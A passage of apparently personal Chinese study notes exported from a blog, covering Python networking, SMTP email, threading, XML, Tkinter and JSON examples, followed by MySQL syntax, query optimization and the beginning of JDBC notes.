cursor.execute(sql) # 提交修改 db.commit() except: # 发生错误时回滚 db.rollback() # 关闭连接 db.close() Python 网络编程 Python 提供了两个级别访问的网络服务。： 低级别的网络服务支持基本的 Socket，它提供了标准的 BSD Sockets API，可以访问底层操作系统Socket接口的全部方法。 高级别的网络服务模块 SocketServer， 它提供了服务器中心类，可以简化网络服务器的开发。 什么是 Socket? Socket又称&quot;套接字&quot;，应用程序通常通过&quot;套接字&quot;向网络发出请求或者应答网络请求，使主机间或者一台计算机上的进程间可以通讯。 服务端： #!/usr/bin/python # -*- coding: UTF-8 -*- # 文件名：server.py import socket # 导入 socket 模块 s = socket.socket() # 创建 socket 对象 host = socket.gethostname() # 获取本地主机名 port = 12345 # 设置端口 s.bind((host, port)) # 绑定端口 s.listen(5) # 等待客户端连接 while True: c, addr = s.accept() # 建立客户端连接。 print &apos;连接地址：&apos;, addr c.send(&apos;欢迎访问菜鸟教程！&apos;) c.close() # 关闭连接 客户端： #!/usr/bin/python # -*- coding: UTF-8 -*- # 文件名：client.py import socket # 导入 socket 模块 s = socket.socket() # 创建 socket 对象 host = socket.gethostname() # 获取本地主机名 port = 12345 # 设置端口好 s.connect((host, port)) print s.recv(1024) s.close() 第一个终端执行 server.py 文件： $ python server.py 第二个终端执行 client.py 文件： $ python client.py 欢迎访问菜鸟教程！ 这时我们再打开第一个终端，就会看到有以下信息输出： 连接地址： (&apos;192.168.0.118&apos;, 62461) Python SMTP发送邮件 SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议,它是一组用于由源地址到目的地址传送邮件的规则，由它来控制信件的中转方式。 python的smtplib提供了一种很方便的途径发送电子邮件。它对smtp协议进行了简单的封装。 Python SMTP 对象使用 sendmail 方法发送邮件，语法如下： SMTP.sendmail(from_addr, to_addrs, msg[, mail_options, rcpt_options]) 参数说明： from_addr: 邮件发送者地址。 to_addrs: 字符串列表，邮件发送地址。 msg: 发送消息 需要你本机已安装了支持 SMTP 的服务 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib from email.mime.text import MIMEText from email.header import Header sender = &apos;from@runoob.com&apos; receivers = [&apos;429240967@qq.com&apos;] # 接收邮件，可设置为你的QQ邮箱或者其他邮箱 # 三个参数：第一个为文本内容，第二个 plain 设置文本格式，第三个 utf-8 设置编码 message = MIMEText(&apos;Python 邮件发送测试...&apos;, &apos;plain&apos;, &apos;utf-8&apos;) message[&apos;From&apos;] = Header(&quot;菜鸟教程&quot;, &apos;utf-8&apos;) # 发送者 message[&apos;To&apos;] = Header(&quot;测试&quot;, &apos;utf-8&apos;) # 接收者 subject = &apos;Python SMTP 邮件测试&apos; message[&apos;Subject&apos;] = Header(subject, &apos;utf-8&apos;) try: smtpObj = smtplib.SMTP(&apos;localhost&apos;) smtpObj.sendmail(sender, receivers, message.as_string()) print &quot;邮件发送成功&quot; except smtplib.SMTPException: print &quot;Error: 无法发送邮件&quot; 如果我们本机没有 sendmail 访问，也可以使用其他邮件服务商的 SMTP 访问（QQ、网易、Google等）。 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib from email.mime.text import MIMEText from email.header import Header # 第三方 SMTP 服务 mail_host=&quot;smtp.XXX.com&quot; #设置服务器 mail_user=&quot;XXXX&quot; #用户名 mail_pass=&quot;XXXXXX&quot; #口令 sender = &apos;from@runoob.com&apos; receivers = [&apos;429240967@qq.com&apos;] # 接收邮件，可设置为你的QQ邮箱或者其他邮箱 message = MIMEText(&apos;Python 邮件发送测试...&apos;, &apos;plain&apos;, &apos;utf-8&apos;) message[&apos;From&apos;] = Header(&quot;菜鸟教程&quot;, &apos;utf-8&apos;) message[&apos;To&apos;] = Header(&quot;测试&quot;, &apos;utf-8&apos;) subject = &apos;Python SMTP 邮件测试&apos; message[&apos;Subject&apos;] = Header(subject, &apos;utf-8&apos;) try: smtpObj = smtplib.SMTP() smtpObj.connect(mail_host, 25) # 25 为 SMTP 端口号 smtpObj.login(mail_user,mail_pass) smtpObj.sendmail(sender, receivers, message.as_string()) print &quot;邮件发送成功&quot; except smtplib.SMTPException: print &quot;Error: 无法发送邮件&quot; 使用Python发送HTML格式的邮件 mail_msg = &quot;&quot;&quot; &lt;p&gt;Python 邮件发送测试...&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;http://www.runoob.com&quot;&gt;这是一个链接&lt;/a&gt;&lt;/p&gt; &quot;&quot;&quot; message = MIMEText(mail_msg, &apos;html&apos;, &apos;utf-8&apos;) Python 发送带附件的邮件 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib from email.mime.text import MIMEText from email.mime.multipart import MIMEMultipart from email.header import Header sender = &apos;from@runoob.com&apos; receivers = [&apos;429240967@qq.com&apos;] # 接收邮件，可设置为你的QQ邮箱或者其他邮箱 #创建一个带附件的实例 message = MIMEMultipart() message[&apos;From&apos;] = Header(&quot;菜鸟教程&quot;, &apos;utf-8&apos;) message[&apos;To&apos;] = Header(&quot;测试&quot;, &apos;utf-8&apos;) subject = &apos;Python SMTP 邮件测试&apos; message[&apos;Subject&apos;] = Header(subject, &apos;utf-8&apos;) #邮件正文内容 message.attach(MIMEText(&apos;这是菜鸟教程Python 邮件发送测试……&apos;, &apos;plain&apos;, &apos;utf-8&apos;)) # 构造附件1，传送当前目录下的 test.txt 文件 att1 = MIMEText(open(&apos;test.txt&apos;, &apos;rb&apos;).read(), &apos;base64&apos;, &apos;utf-8&apos;) att1[&quot;Content-Type&quot;] = &apos;application/octet-stream&apos; # 这里的filename可以任意写，写什么名字，邮件中显示什么名字 att1[&quot;Content-Disposition&quot;] = &apos;attachment; filename=&quot;test.txt&quot;&apos; message.attach(att1) # 构造附件2，传送当前目录下的 runoob.txt 文件 att2 = MIMEText(open(&apos;runoob.txt&apos;, &apos;rb&apos;).read(), &apos;base64&apos;, &apos;utf-8&apos;) att2[&quot;Content-Type&quot;] = &apos;application/octet-stream&apos; att2[&quot;Content-Disposition&quot;] = &apos;attachment; filename=&quot;runoob.txt&quot;&apos; message.attach(att2) try: smtpObj = smtplib.SMTP(&apos;localhost&apos;) smtpObj.sendmail(sender, receivers, message.as_string()) print &quot;邮件发送成功&quot; except smtplib.SMTPException: print &quot;Error: 无法发送邮件&quot; 在 HTML 文本中添加图片 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib from email.mime.image import MIMEImage from email.mime.multipart import MIMEMultipart from email.mime.text import MIMEText from email.header import Header sender = &apos;from@runoob.com&apos; receivers = [&apos;429240967@qq.com&apos;] # 接收邮件，可设置为你的QQ邮箱或者其他邮箱 msgRoot = MIMEMultipart(&apos;related&apos;) msgRoot[&apos;From&apos;] = Header(&quot;菜鸟教程&quot;, &apos;utf-8&apos;) msgRoot[&apos;To&apos;] = Header(&quot;测试&quot;, &apos;utf-8&apos;) subject = &apos;Python SMTP 邮件测试&apos; msgRoot[&apos;Subject&apos;] = Header(subject, &apos;utf-8&apos;) msgAlternative = MIMEMultipart(&apos;alternative&apos;) msgRoot.attach(msgAlternative) mail_msg = &quot;&quot;&quot; &lt;p&gt;Python 邮件发送测试...&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;http://www.runoob.com&quot;&gt;菜鸟教程链接&lt;/a&gt;&lt;/p&gt; &lt;p&gt;图片演示：&lt;/p&gt; &lt;p&gt;&lt;img src=&quot;cid:image1&quot;&gt;&lt;/p&gt; &quot;&quot;&quot; msgAlternative.attach(MIMEText(mail_msg, &apos;html&apos;, &apos;utf-8&apos;)) # 指定图片为当前目录 fp = open(&apos;test.png&apos;, &apos;rb&apos;) msgImage = MIMEImage(fp.read()) fp.close() # 定义图片 ID，在 HTML 文本中引用 msgImage.add_header(&apos;Content-ID&apos;, &apos;&lt;image1&gt;&apos;) msgRoot.attach(msgImage) try: smtpObj = smtplib.SMTP(&apos;localhost&apos;) smtpObj.sendmail(sender, receivers, msgRoot.as_string()) print &quot;邮件发送成功&quot; except smtplib.SMTPException: print &quot;Error: 无法发送邮件&quot; 使用第三方 SMTP 服务发送 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib from email.mime.text import MIMEText from email.utils import formataddr my_sender=&apos;429240967@qq.com&apos; # 发件人邮箱账号 my_pass = &apos;xxxxxxxxxx&apos; # 发件人邮箱密码 my_user=&apos;429240967@qq.com&apos; # 收件人邮箱账号，我这边发送给自己 def mail(): ret=True try: msg=MIMEText(&apos;填写邮件内容&apos;,&apos;plain&apos;,&apos;utf-8&apos;) msg[&apos;From&apos;]=formataddr([&quot;FromRunoob&quot;,my_sender]) # 括号里的对应发件人邮箱昵称、发件人邮箱账号 msg[&apos;To&apos;]=formataddr([&quot;FK&quot;,my_user]) # 括号里的对应收件人邮箱昵称、收件人邮箱账号 msg[&apos;Subject&apos;]=&quot;菜鸟教程发送邮件测试&quot; # 邮件的主题，也可以说是标题 server=smtplib.SMTP_SSL(&quot;smtp.qq.com&quot;, 465) # 发件人邮箱中的SMTP服务器，端口是25 server.login(my_sender, my_pass) # 括号中对应的是发件人邮箱账号、邮箱密码 server.sendmail(my_sender,[my_user,],msg.as_string()) # 括号中对应的是发件人邮箱账号、收件人邮箱账号、发送邮件 server.quit() # 关闭连接 except Exception: # 如果 try 中的语句没有执行，则会执行下面的 ret=False ret=False return ret ret=mail() if ret: print(&quot;邮件发送成功&quot;) else: print(&quot;邮件发送失败&quot;) python多线程： Python中使用线程有两种方式：函数或者用类来包装线程对象。 #!/usr/bin/python # -*- coding: UTF-8 -*- import thread import time # 为线程定义一个函数 def print_time( threadName, delay): count = 0 while count &lt; 5: time.sleep(delay) count += 1 print &quot;%s: %s&quot; % ( threadName, time.ctime(time.time()) ) # 创建两个线程 try: thread.start_new_thread( print_time, (&quot;Thread-1&quot;, 2, ) ) thread.start_new_thread( print_time, (&quot;Thread-2&quot;, 4, ) ) except: print &quot;Error: unable to start thread&quot; while 1: pass 线程模块 Python通过两个标准库thread和threading提供对线程的支持。thread提供了低级别的、原始的线程以及一个简单的锁。 threading 模块提供的其他方法： threading.currentThread(): 返回当前的线程变量。 threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。 threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。 除了使用方法外，线程模块同样提供了Thread类来处理线程，Thread类提供了以下方法: run(): 用以表示线程活动的方法。 start():启动线程活动。 join([time]): 等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生。 isAlive(): 返回线程是否活动的。 getName(): 返回线程名。 setName(): 设置线程名。 使用Threading模块创建线程 使用Threading模块创建线程，直接从threading.Thread继承，然后重写__init__方法和run方法 #!/usr/bin/python # -*- coding: UTF-8 -*- import threading import time exitFlag = 0 class myThread (threading.Thread): #继承父类threading.Thread def __init__(self, threadID, name, counter): threading.Thread.__init__(self) self.threadID = threadID self.name = name self.counter = counter def run(self): #把要执行的代码写到run函数里面 线程在创建后会直接运行run函数 print &quot;Starting &quot; + self.name print_time(self.name, self.counter, 5) print &quot;Exiting &quot; + self.name def print_time(threadName, delay, counter): while counter: if exitFlag: (threading.Thread).exit() time.sleep(delay) print &quot;%s: %s&quot; % (threadName, time.ctime(time.time())) counter -= 1 # 创建新线程 thread1 = myThread(1, &quot;Thread-1&quot;, 1) thread2 = myThread(2, &quot;Thread-2&quot;, 2) # 开启线程 thread1.start() thread2.start() print &quot;Exiting Main Thread&quot; 线程同步： #!/usr/bin/python # -*- coding: UTF-8 -*- import threading import time class myThread (threading.Thread): def __init__(self, threadID, name, counter): threading.Thread.__init__(self) self.threadID = threadID self.name = name self.counter = counter def run(self): print &quot;Starting &quot; + self.name # 获得锁，成功获得锁定后返回True # 可选的timeout参数不填时将一直阻塞直到获得锁定 # 否则超时后将返回False threadLock.acquire() print_time(self.name, self.counter, 3) # 释放锁 threadLock.release() def print_time(threadName, delay, counter): while counter: time.sleep(delay) print &quot;%s: %s&quot; % (threadName, time.ctime(time.time())) counter -= 1 threadLock = threading.Lock() threads = [] # 创建新线程 thread1 = myThread(1, &quot;Thread-1&quot;, 1) thread2 = myThread(2, &quot;Thread-2&quot;, 2) # 开启新线程 thread1.start() thread2.start() # 添加线程到线程列表 threads.append(thread1) threads.append(thread2) # 等待所有线程完成 for t in threads: t.join() print &quot;Exiting Main Thread&quot; 线程优先级队列（ Queue） Queue.qsize() 返回队列的大小 Queue.empty() 如果队列为空，返回True,反之False Queue.full() 如果队列满了，返回True,反之False Queue.full 与 maxsize 大小对应 Queue.get([block[, timeout]])获取队列，timeout等待时间 Queue.get_nowait() 相当Queue.get(False) Queue.put(item) 写入队列，timeout等待时间 Queue.put_nowait(item) 相当Queue.put(item, False) Queue.task_done() 在完成一项工作之后，Queue.task_done()函数向任务已经完成的队列发送一个信号 Queue.join() 实际上意味着等到队列为空，再执行别的操作 #!/usr/bin/python # -*- coding: UTF-8 -*- import Queue import threading import time exitFlag = 0 class myThread (threading.Thread): def __init__(self, threadID, name, q): threading.Thread.__init__(self) self.threadID = threadID self.name = name self.q = q def run(self): print &quot;Starting &quot; + self.name process_data(self.name, self.q) print &quot;Exiting &quot; + self.name def process_data(threadName, q): while not exitFlag: queueLock.acquire() if not workQueue.empty(): data = q.get() queueLock.release() print &quot;%s processing %s&quot; % (threadName, data) else: queueLock.release() time.sleep(1) threadList = [&quot;Thread-1&quot;, &quot;Thread-2&quot;, &quot;Thread-3&quot;] nameList = [&quot;One&quot;, &quot;Two&quot;, &quot;Three&quot;, &quot;Four&quot;, &quot;Five&quot;] queueLock = threading.Lock() workQueue = Queue.Queue(10) threads = [] threadID = 1 # 创建新线程 for tName in threadList: thread = myThread(threadID, tName, workQueue) thread.start() threads.append(thread) threadID += 1 # 填充队列 queueLock.acquire() for word in nameList: workQueue.put(word) queueLock.release() # 等待队列清空 while not workQueue.empty(): pass # 通知线程是时候退出 exitFlag = 1 # 等待所有线程完成 for t in threads: t.join() print &quot;Exiting Main Thread&quot; python有三种方法解析XML，SAX，DOM，以及ElementTree: 1.SAX (simple API for XML ) python 标准库包含SAX解析器，SAX用事件驱动模型，通过在解析XML的过程中触发一个个的事件并调用用户定义的回调函数来处理XML文件。 2.DOM(Document Object Model) 将XML数据在内存中解析成一个树，通过对树的操作来操作XML。 3.ElementTree(元素树) ElementTree就像一个轻量级的DOM，具有方便友好的API。代码可用性好，速度快，消耗内存少。 movies.xml &lt;collection shelf=&quot;New Arrivals&quot;&gt; &lt;movie title=&quot;Enemy Behind&quot;&gt; &lt;type&gt;War, Thriller&lt;/type&gt; &lt;format&gt;DVD&lt;/format&gt; &lt;year&gt;2003&lt;/year&gt; &lt;rating&gt;PG&lt;/rating&gt; &lt;stars&gt;10&lt;/stars&gt; &lt;description&gt;Talk about a US-Japan war&lt;/description&gt; &lt;/movie&gt; &lt;movie title=&quot;Transformers&quot;&gt; &lt;type&gt;Anime, Science Fiction&lt;/type&gt; &lt;format&gt;DVD&lt;/format&gt; &lt;year&gt;1989&lt;/year&gt; &lt;rating&gt;R&lt;/rating&gt; &lt;stars&gt;8&lt;/stars&gt; &lt;description&gt;A schientific fiction&lt;/description&gt; &lt;/movie&gt; &lt;movie title=&quot;Trigun&quot;&gt; &lt;type&gt;Anime, Action&lt;/type&gt; &lt;format&gt;DVD&lt;/format&gt; &lt;episodes&gt;4&lt;/episodes&gt; &lt;rating&gt;PG&lt;/rating&gt; &lt;stars&gt;10&lt;/stars&gt; &lt;description&gt;Vash the Stampede!&lt;/description&gt; &lt;/movie&gt; &lt;movie title=&quot;Ishtar&quot;&gt; &lt;type&gt;Comedy&lt;/type&gt; &lt;format&gt;VHS&lt;/format&gt; &lt;rating&gt;PG&lt;/rating&gt; &lt;stars&gt;2&lt;/stars&gt; &lt;description&gt;Viewable boredom&lt;/description&gt; &lt;/movie&gt; &lt;/collection&gt; 使用SAX解析xml #!/usr/bin/python # -*- coding: UTF-8 -*- import xml.sax class MovieHandler( xml.sax.ContentHandler ): def __init__(self): self.CurrentData = &quot;&quot; self.type = &quot;&quot; self.format = &quot;&quot; self.year = &quot;&quot; self.rating = &quot;&quot; self.stars = &quot;&quot; self.description = &quot;&quot; # 元素开始事件处理 def startElement(self, tag, attributes): self.CurrentData = tag if tag == &quot;movie&quot;: print &quot;*****Movie*****&quot; title = attributes[&quot;title&quot;] print &quot;Title:&quot;, title # 元素结束事件处理 def endElement(self, tag): if self.CurrentData == &quot;type&quot;: print &quot;Type:&quot;, self.type elif self.CurrentData == &quot;format&quot;: print &quot;Format:&quot;, self.format elif self.CurrentData == &quot;year&quot;: print &quot;Year:&quot;, self.year elif self.CurrentData == &quot;rating&quot;: print &quot;Rating:&quot;, self.rating elif self.CurrentData == &quot;stars&quot;: print &quot;Stars:&quot;, self.stars elif self.CurrentData == &quot;description&quot;: print &quot;Description:&quot;, self.description self.CurrentData = &quot;&quot; # 内容事件处理 def characters(self, content): if self.CurrentData == &quot;type&quot;: self.type = content elif self.CurrentData == &quot;format&quot;: self.format = content elif self.CurrentData == &quot;year&quot;: self.year = content elif self.CurrentData == &quot;rating&quot;: self.rating = content elif self.CurrentData == &quot;stars&quot;: self.stars = content elif self.CurrentData == &quot;description&quot;: self.description = content if ( __name__ == &quot;__main__&quot;): # 创建一个 XMLReader parser = xml.sax.make_parser() # turn off namepsaces parser.setFeature(xml.sax.handler.feature_namespaces, 0) # 重写 ContextHandler Handler = MovieHandler() parser.setContentHandler( Handler ) parser.parse(&quot;movies.xml&quot;) 使用xml.dom解析xml #!/usr/bin/python # -*- coding: UTF-8 -*- from xml.dom.minidom import parse import xml.dom.minidom # 使用minidom解析器打开 XML 文档 DOMTree = xml.dom.minidom.parse(&quot;movies.xml&quot;) collection = DOMTree.documentElement if collection.hasAttribute(&quot;shelf&quot;): print &quot;Root element : %s&quot; % collection.getAttribute(&quot;shelf&quot;) # 在集合中获取所有电影 movies = collection.getElementsByTagName(&quot;movie&quot;) # 打印每部电影的详细信息 for movie in movies: print &quot;*****Movie*****&quot; if movie.hasAttribute(&quot;title&quot;): print &quot;Title: %s&quot; % movie.getAttribute(&quot;title&quot;) type = movie.getElementsByTagName(&apos;type&apos;)[0] print &quot;Type: %s&quot; % type.childNodes[0].data format = movie.getElementsByTagName(&apos;format&apos;)[0] print &quot;Format: %s&quot; % format.childNodes[0].data rating = movie.getElementsByTagName(&apos;rating&apos;)[0] print &quot;Rating: %s&quot; % rating.childNodes[0].data description = movie.getElementsByTagName(&apos;description&apos;)[0] print &quot;Description: %s&quot; % description.childNodes[0].data Python GUI编程(Tkinter) Python 提供了多个图形开发界面的库，几个常用 Python GUI 库如下： Tkinter。 wxPython Jython 创建一个GUI程序 1、导入 Tkinter 模块 2、创建控件 3、指定这个控件的 master， 即这个控件属于哪一个 4、告诉 GM(geometry manager) 有一个控件产生了。 #!/usr/bin/python # -*- coding: UTF-8 -*- import Tkinter top = Tkinter.Tk() # 进入消息循环 top.mainloop() #!/usr/bin/python # -*- coding: UTF-8 -*- from Tkinter import * # 导入 Tkinter 库 root = Tk() # 创建窗口对象的背景色 # 创建两个列表 li = [&apos;C&apos;,&apos;python&apos;,&apos;php&apos;,&apos;html&apos;,&apos;SQL&apos;,&apos;java&apos;] movie = [&apos;CSS&apos;,&apos;jQuery&apos;,&apos;Bootstrap&apos;] listb = Listbox(root) # 创建两个列表组件 listb2 = Listbox(root) for item in li: # 第一个小部件插入数据 listb.insert(0,item) for item in movie: # 第二个小部件插入数据 listb2.insert(0,item) listb.pack() # 将小部件放置到主窗口中 listb2.pack() root.mainloop() # 进入消息循环 python json： #!/usr/bin/python import json data = [ { &apos;a&apos; : 1, &apos;b&apos; : 2, &apos;c&apos; : 3, &apos;d&apos; : 4, &apos;e&apos; : 5 } ] json = json.dumps(data) print json 以上代码执行结果为： [{&quot;a&quot;: 1, &quot;c&quot;: 3, &quot;b&quot;: 2, &quot;e&quot;: 5, &quot;d&quot;: 4}] 使用参数让 JSON 数据格式化输出： &gt;&gt;&gt; import json &gt;&gt;&gt; print json.dumps({&apos;a&apos;: &apos;Runoob&apos;, &apos;b&apos;: 7}, sort_keys=True, indent=4, separators=(&apos;,&apos;, &apos;: &apos;)) { &quot;a&quot;: &quot;Runoob&quot;, &quot;b&quot;: 7 } json.loads 用于解码 JSON 数据。 #!/usr/bin/python import json jsonData = &apos;{&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5}&apos;; text = json.loads(jsonData) print text 以上代码执行结果为： {u&apos;a&apos;: 1, u&apos;c&apos;: 3, u&apos;b&apos;: 2, u&apos;e&apos;: 5, u&apos;d&apos;: 4} 使用第三方库：Demjson $ tar -xvzf demjson-2.2.3.tar.gz $ cd demjson-2.2.3 $ python setup.py install 函数 描述 encode 将 Python 对象编码成 JSON 字符串 decode 将已编码的 JSON 字符串解码为 Python 对象 #!/usr/bin/python import demjson data = [ { &apos;a&apos; : 1, &apos;b&apos; : 2, &apos;c&apos; : 3, &apos;d&apos; : 4, &apos;e&apos; : 5 } ] json = demjson.encode(data) print json 以上代码执行结果为： [{&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5}] #!/usr/bin/python import demjson json = &apos;{&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5}&apos;; text = demjson.decode(json) print text 以上代码执行结果为： {u&apos;a&apos;: 1, u&apos;c&apos;: 3, u&apos;b&apos;: 2, u&apos;e&apos;: 5, u&apos;d&apos;: 4} python 100例 （待做）]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>python</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2FMySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[&lt;font size=6 color=&quot;#0000FF&quot;&gt; MYSQL &lt;/font&gt; navicat premium use databases; show tables; show databases; use test; desc student; -- 简单显示表结构信息 describe student; -- 详细显示表结构信息 show create table student; CREATE TABLE `student`()ENGINE = InnoDB (存储引擎) DEFAULT CHARSET=utf8 MyISAM 不支持事务，支持表级别的锁，锁粒度大 InnoDB 支持事务，支持锁粒度小，既有表锁又有行级别的锁 两种存储引擎的区别： 数据库里面的文件系统，规定了数据怎么存，怎么处理 InnoDB，适合处理电商银行的数据存储。 MyISAM，适合日志（读比写多的地方）（新项目几乎不用） use test; -- 给表改名字 alert table studnet rename student_new -- 给表中的字段改名字（同时还可以把字段对应的类型改了） alert table student change birthday birthday_new varchar(255); desc student; -- 给表添加字段，添加到最后 alter table student add addr varchar(500) -- 删除表中的字段 alter table student; drop addr; -- 将字段加到score字段后面 alter table student add addr varchar(500) after score; alter table student modify addr varchar(600) comment &apos;家庭住址&apos;; 类似：`addr` varchar(600) DEFAULT NULL COMMENT &apos;家庭住址&apos; show create table studnet; insert into person(id,name,salary) values(2,&apos;xx&apos;,1.0); delete from person where name = &apos;a&apos;; update person set salary = salary + 10,addr = &apos;yy&apos; where id = 3; alter table person add primary key(id); -- PRIMARY KEY(`id`);(这句在属性的后面) id int auto_increment, //自增id name varchar(100), primary key(id) delete from person where id in (3,4,5); CREATE TABLE `person`( `id` int(11) NOT NULL AUTO_INCREMENT, primay key(id) )ENGINE=InnoDB AUTO_INCREMENT=5 //已经即将自增到5了 select database(); create table student( id int, name varchar(20), teacher_id int ); create table teacher( id int, name varchar(20) ); alter table student modify teacher_id decimal(18,2) alter table student modify teacher_id int alter table teacher add PRIMARY key(id) -- 添加外键 alter table student add FOREING key (teacher_id) REFERENCES teacher(id); 主键跟外键都会有索引 KEY 代表索引 KEY `teacher_id`(`teacher_id`) select char_length(&apos;中国abc&apos;); -- 数字符的个数 select length(&apos;中国&apos;); -- utf8 一个汉字占3个字节 select concat(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;); -- abc 拼接参数 select concat_ws(&apos;=&apos;,&apos;a&apos;,&apos;b&apos;,&apos;c&apos;); -- a=b=c 使用第一个参数作为中间符放入后面参数 select upper(&apos;aBcd&apos;); -- 大写 select lower(&apos;ABcd&apos;); -- 小写 select substring(&apos;系统信息类&apos;,1 ,3) -- 截取 select trim(&apos; abc. &apos;); -- 去前后空格 select curdate(); -- 当前日期对应的年月日 select now(); -- 当前日期到秒 select sysdate(); -- 一样，当前日期到秒 -- 返回当前日期时间对应的时间戳（单位：妙） select unix_timestamp(); select unix_timestamp(curtime()); -- 将时间戳转回日期时间到秒 select from_unixtime(123213213123); -- 只能到天，-2表示在now()基础上减2天,3的话就是加3天 select adddate(now(),-2); select if(1=1,&apos;成立&apos;,&apos;不成立&apos;); -- 如果有null，我就给它添一个值 use test; select id,name,ifnull(age,0) as age from person_2; create table student_info( id int, name varchar(20), score decimal(18,2) ); insert into student_info(id,name,score) values (1,&apos;小红&apos;,99.8) X4 -- 80以上 A -- 70-80 B -- 60-70 C -- &lt;60 D create view stu_score as select id,name,score, ( case when score &gt;= 80 then &apos;A&apos; when score &gt;= 70 and score &lt; 80 then &apos;B&apos; when score &gt;= 60 and score &lt; 70 then &apos;C&apos; when score &lt; 60 then &apos;D&apos; end ) as rank from student_info; select id,name,score,rank, ( case rank when &apos;A&apos; then &apos;优&apos; when &apos;B&apos; then &apos;中&apos; when &apos;C&apos; then &apos;良&apos; when &apos;D&apos; then &apos;差&apos; end ) as ch_rank from stu_score; -- &lt;&gt; 不等于 select * from stu_score where rank &lt;&gt; &apos;B&apos; select * from person where age is null select * from student_info where name like &apos;%小%&apos; -- 如果student_id相同，则接下来按score降序继续排序 select distinct name from person order by student_id asc,score desc limit 30 use cm; select database(); select count(*) from score group by cno; //not in 清洗重复数据 select cno,avg(degree) as chengji from score group by cno; use test; select id,name, (select name from teacher where id = teacher_id) as teacher_name from student; -- 子查询第三种场景，跟在where后面，通常和in搭配 use test; select * from student where teacher_id = ( select id from teacher where name = &apos;王老师&apos; ); -- 这种写法会先对连接的所有的表做一次完全笛卡尔积 -- 如果表很大，这种写法非常耗资源（内存） select * from student,teacher where student.teacher_id = teacher.id; -- 规范写法 (第一行的笛卡尔积不满足条件也就出现不了) select s.id,s.name,t.name as teacher_name from student s inner join teacher t on t.id = s.teacher_id //同名字段就选一个起别名 select s.id,s.name,t.name as teacher_name from student s left join teacher t on t.id = s.teacher_id //一般最重要的表放到左边 //优先使用inner，因为其性能好。如果有丢数据就改为left或其它的 性能优化 慢查询原因（通常DBMS都有自己的慢查询日志） 外部原因：内存太小，本地I/O瓶颈，网络I/O瓶颈。 内部原因：程序本身DB设计不合理，SQL语句使用不合理，无索引或者有索引但未充分利用。 学会使用explain分析简单的查询 数据库设计层面的优化 遵循数据库设计三范式（通俗地讲就是每个字段不可再拆分，尽量减少冗余字段）； 字段类型设计上，能使用数值就不要使用字符串，能使用日期时间就不要使用字符串，最好把字段声明为not null default 默认值； //字符串需要先查字符集转换编码，所以慢 //如果设计成允许null，数据库需要留选一段空间来标识其为null 为了避免表连接查询，必要的冗余字段是可以设置的； 能提前建立的索引要提前建好（经常用在where，group by，order by中的字段最好建索引） 创建索引方式一：alter table student_score add key idx_sc_s_c(sname,cname); 删除索引方式一：alter table student_score drop key idx_sc_s_c; 创建索引方式二：create index idx_sc_c on student_score(cname); 删除索引方式二：drop index idx_sc_c on student_score; explain select * from student_score; show create table student_score; explain select * from student_score where sname = &apos;小王&apos;; 加索引会降低写的性能 -- 添加索引 -- alter table student_score -- add key idx_sc_s (sname); alter table student_score add key idx_sc_s_c (sname,cname); 索引命名方式：idex_sc_s sc：哪张表 s,c：那个字段 SQL语句使用层面的优化 尽量不使用select *,而是要具体指定字段，比如select id,name...; 尽量不使用不等于&lt;&gt;; 不使用is null/is not null (虽然也会使用索引，但是性能损耗是由于default null的字段要比not null的字段多出额外的存储空间来标识这个字段的值是不是null)； 不使用or连接不同的字段； 不使用not in； 不在条件字段上使用函数； 不使用前置模糊查询(like &apos;%a&apos;);等。 因为上面的使用方式都会产生全表扫描(当然，如果实在没办法优化，全表扫描就扫描吧) 索引优化 建立索引的字段从内容上要有差异要有区分度。 索引提升的是读性能，如果一张表的写操作更多，则尽量不建或者少建索引。 使用where，group by，order by时，尽量充分利用建立索引的字段 数据导出导入 //不要使用客户端倒 mysql/bin/mysqldump.exe //往外倒 mysql/bin/mysqlimport.exe //往里倒 use test; select sname, max( case cname when &apos;Java&apos; then score else 0.0 end ) as Java, max( case cname when &apos;MySQL&apos; then score else 0.0 end ) as MySQL from student_score group by sname; -- group_concat()把每条记录取出来拼一块,separator分割的是每一行的数据,order by 要放在separator前面而不是后面 select sc.*,group_concat(canme,&apos;=&apos;,order by cname score separator &apos;|&apos;) as gc from student_score sc group by sname; JDBC Build Path-&gt;Configure Build Path... lib-&gt;xxx.jar Add JARs... JDBC相关的类与接口 java.sql.Driver 接口 java.sql.DriverManager类 //注册驱动 ctrl+o 搜索查看方法 Connection getConnection java.sql.Connection接口 void close() Statement createStatement() PreparedStatement prepareStatement(String sql java.sql.Statement 接口 void close() boolean execute(String sql) ResultSet executeQuery(String sql) int executeUpdate(String sql) void addBatch(String sql) //接受多条sql语句 int[] executeBatch() java.sql.PreparedStatement 接口 extends java.sql.Statement void setXXX(int parameterIndex,xxx value) ResultSet executeQuery() int executeUpdate() java.sql.ResultSet 接口 //查询的结果组成的二维表 void close() boolean next() xxx getXXX(String columnName) test(){ String className = &quot;&quot;;//com.mysql.jdbc.Driver Class.forName(className); DriverManager.getConncetion(url,user,password); //url : jdbc:mysql://127.0.0.1:3306/test //类似sql: use 